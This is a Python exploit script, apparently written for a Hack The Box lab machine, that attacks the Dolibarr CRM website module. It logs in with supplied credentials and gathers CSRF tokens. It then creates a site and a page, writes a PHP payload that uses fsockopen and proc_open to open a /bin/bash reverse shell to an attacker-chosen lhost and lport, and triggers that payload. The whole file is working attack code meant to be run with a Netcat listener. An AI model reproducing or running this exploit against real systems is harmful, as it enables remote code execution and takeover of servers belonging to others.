import requests
from bs4 import BeautifulSoup
import click
from requests_toolbelt.multipart.encoder import MultipartEncoder

'''
You'll need to set up a Netcat to catch the shell.
'''


@click.command()
@click.option('--url', help='Enter target url', required=True)
@click.option('--username', help='Enter username', required=True)
@click.option('--password', help='Enter password', required=True)
@click.option('--lhost', help='Enter lhost, for netcat listener', required=True)
@click.option('--lport', help='Enter lport, for netcat listener', required=True)
def runner(url, username, password, lhost, lport):
    iflive(url, username, password)
    print("Fetching CRSF token and cookie:")
    token, cookie = gettoken(url)
    print ("The token is: ", token + "\nThe Cookie is: " + str(cookie)+ "\n")
    print("Logging in to authorise cookie:")
    login(url, username, password, token, cookie)
    print("Success, cookie has in now authorised", cookie)
    print ("Getting second CRSF token from dashboard")
    token = dashboard(url, cookie)
    print("Second token: \n", token)
    print ("Creating website...")
    create_site(url, cookie, token)
    print ("Site created, next create webpage...")
    create_page(url, cookie, token)
    print ("Page created, next writing PHP payload...")
    write_payload(url, cookie, token, lhost, lport)
    print("Finally executing payload...")
    execute(url, token, cookie)
    print("Check your listener")

'''
This function will just check if the site is available. 
'''
def iflive(url, username, password):
    try:
        s = requests.get(url)
        if s.status_code == 200:
            print("Site appears up...\n")
            return
    except:
        print("Check if url is correct")
        exit(0)
    login(url, username, password)

'''
This function will get a CSRF token from the website and a cookie given when a user visits the site. 
'''
def gettoken(url):
    #Gets token
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'lxml')
    csrf_token = soup.find_all(attrs={"name": "token"})
    token = csrf_token[0]['value']
    #Gets cookie
    cookie = r.headers["Set-Cookie"]
    cookie = cookie[:77]
    key, value = cookie.split('=')
    cookie = {key: value}

    return token, cookie

'''
This function will login to the web site, which will use the previously given cookie.
'''
def login(url, username, password, token, cookie):
    with requests.Session() as s:
        loginpage = url + "index.php?mainmenu=home"
        data = {
            "token": token,
            "actionlogin": "login",
            "loginfunction": "loginfunction",
            "backtopage": "",
            "tz": "0",
            "tz_string": "Europe/London",
            "dst_observed": "1",
            "dst_first": "2024-03-31T00:59:00Z",
            "dst_second": "2024-10-27T01:59:00Z",
            "screenwidth": "1473",
            "screenheight": "410",
            "dol_hide_topmenu": "",
            "dol_hide_leftmenu": "",
            "dol_optimize_smallscreen": "",
            "dol_no_mouse_hover": "",
            "dol_use_jmobile": "",
            "username": username,
            "password": password
        }
        r = s.post(loginpage, data=data, allow_redirects=True, cookies=cookie)
        return cookie

'''
This function will get another CSRF token. 
'''
def dashboard(url, cookie):
    with requests.Session() as s:
        dashboard = url + "website/index.php?idmenu=1&mainmenu=website&leftmenu="
        r = s.get(dashboard, cookies=cookie, allow_redirects=True,
                  headers={'Referer': 'http://crm.board.htb/index.php'})
        soup = BeautifulSoup(r.text, 'lxml')
        csrf_token = soup.find_all(attrs={"name": "token"})
        token = csrf_token[0]['value']
        return token

'''
This function creates a website on the site.
'''
def create_site(url, cookie, token):
    with requests.Session() as s:
        create_site_url = url + "website/index.php"
        data = {
            'token': token,
            'backtopage': '',
            'dol_openinpopup': '',
            'action': 'addsite',
            'website': '-1',
            'WEBSITE_REF': 'test',
            'WEBSITE_LANG': 'en',
            'WEBSITE_OTHERLANG': '',
            'WEBSITE_DESCRIPTION': '',
            'virtualhost': '',
            'addcontainer': 'Create'
        }
        multipart_data = MultipartEncoder(fields=data)

        r = s.post(create_site_url, data=multipart_data, allow_redirects=True, cookies=cookie,
                   headers={'Content-Type': multipart_data.content_type})

'''
This function creates a web page on the newly created web site.
'''
def create_page(url, cookie, token):
    with requests.Session() as s:
        create_page_url = url + "website/index.php"
        data = {
            "token": token,
            "backtopage": "",
            "dol_openinpopup": "",
            "action": "addcontainer",
            "website": "test",
            "pageidbis": "-1",
            "pageid": "",
            "radiocreatefrom": "checkboxcreatemanually",
            "WEBSITE_TYPE_CONTAINER": "page",
            "sample": "empty",
            "WEBSITE_TITLE": "test.php",
            "WEBSITE_PAGENAME": "test",
            "WEBSITE_ALIASALT": "",
            "WEBSITE_DESCRIPTION": "",
            "WEBSITE_IMAGE": "",
            "WEBSITE_KEYWORDS": "",
            "WEBSITE_LANG": "0",
            "WEBSITE_AUTHORALIAS": "",
            "datecreation": "07/22/2024",
            "datecreationday": "22",
            "datecreationmonth": "07",
            "datecreationyear": "2024",
            "datecreationhour": "08",
            "datecreationmin": "58",
            "datecreationsec": "20",
            "htmlheader_x": "",
            "htmlheader_y": "",
            "htmlheader": "",
            "addcontainer": "Create",
            "externalurl": "",
            "grabimages": "1",
            "grabimagesinto": "root"
        }

        multipart_data = MultipartEncoder(fields=data)
        r = s.post(create_page_url, data=multipart_data, allow_redirects=True, cookies=cookie,
                   headers={'Content-Type': multipart_data.content_type})

'''
This function will edit the HTML source and add the PHP payload.
'''
def write_payload(url, cookie, token, lhost, lport):
    payload = f'<?PHP $sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>'
    payload = str(payload)
    with requests.Session() as s:
        write_payload = url + "website/index.php"
        data = {
            "token": token,
            "backtopage": "",
            "dol_openinpopup": "",
            "action": "updatesource",
            "website": "test",
            "pageid": "10",
            "update": "Save",
            "PAGE_CONTENT_x": "18",
            "PAGE_CONTENT_y": "0",
            "PAGE_CONTENT": payload
        }

        multipart_data = MultipartEncoder(fields=data)
        r = s.post(write_payload, data=multipart_data, allow_redirects=True, cookies=cookie,
                   headers={'Content-Type': multipart_data.content_type})

'''
This function will enable(show) dynamic content, executing the payload.
'''

def execute(url, token, cookie):
    execute_url = url + f"/website/index.php?website=test&pageid=4&action=setshowsubcontainers&token={token}"
    with requests.Session() as s:
        r = s.get(execute_url, allow_redirects=True, cookies=cookie)

if __name__ == '__main__':
    runner()
